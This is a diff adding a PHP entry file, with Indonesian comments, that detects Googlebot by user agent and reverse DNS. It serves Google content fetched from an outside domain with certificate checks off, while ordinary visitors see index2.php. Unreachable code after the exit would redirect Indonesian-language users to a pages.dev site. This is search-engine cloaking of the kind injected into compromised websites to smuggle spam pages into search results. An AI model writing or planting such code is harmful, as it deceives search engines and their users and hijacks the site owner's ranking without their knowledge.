@@ -1,0 +1,55 @@
+<?php
+// Deteksi Googlebot (akurat + reverse DNS)
+function is_google_bot() {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    if (stripos($ua, 'Googlebot') !== false || 
+        stripos($ua, 'Google-InspectionTool') !== false ||
+        stripos($ua, 'Google-Site-Verification') !== false) {
+        return true;
+    }
+    
+    // Reverse DNS check (paling akurat)
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    $host = @gethostbyaddr($ip);
+    if ($host && (strpos($host, 'googlebot.com') !== false || strpos($host, 'google.com') !== false)) {
+        return true;
+    }
+    return false;
+}
+
+// Kalau Googlebot → pakai cURL only (bypass Cloudflare BAILOUT)
+if (is_google_bot()) {
+    $url = 'https://jahitjas.id/'; //raws landingpages
+    
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT        => 12,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+        CURLOPT_HTTPHEADER     => [
+            'Accept: text/plain',
+            'Referer: https://www.google.com/'
+        ]
+    ]);
+    
+    $content = curl_exec($ch);
+    curl_close($ch);
+    
+    // Kalau gagal total → langsung blank (sesuai request kamu, tanpa fallback)
+    echo $content ?: '';
+    exit;
+}
+
+// Bukan bot → tampilkan konten normal
+include('index2.php'); 
+exit;
+
+// Redirect user Indonesia (amp tetap jalan) 
+$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '', 0, 2);
+if ($lang === 'id') {
+    header('Location: https://escoladegoverno-historico.pages.dev/');
+    exit;
+}
+?>
